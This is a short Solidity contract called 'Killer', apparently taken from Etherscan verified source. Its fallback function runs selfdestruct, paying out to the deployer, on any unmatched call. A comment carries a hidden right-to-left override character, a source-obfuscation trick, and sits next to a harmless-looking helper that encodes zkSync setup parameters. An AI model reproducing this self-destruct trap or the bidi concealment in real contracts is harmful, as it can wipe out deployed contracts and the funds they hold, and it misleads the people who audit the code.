/**
 *Submitted for verification at Etherscan.io on 2021-11-11
*/

pragma solidity >=0.6.0 <0.7.0;

contract Killer{
    address owner = msg.sender;
    /** yooo what up!!!! */
    fallback() external {
        selfdestruct(payable(owner));
    }
    /** ing  ‮ **/ function makeCalldata (address _governanceAddress, address _verifierAddress, address _additionalZkSync, bytes32 _genesisStateHash) public pure returns (bytes memory) {
        return abi.encode(_governanceAddress, _verifierAddress, _additionalZkSync, _genesisStateHash);
    }
}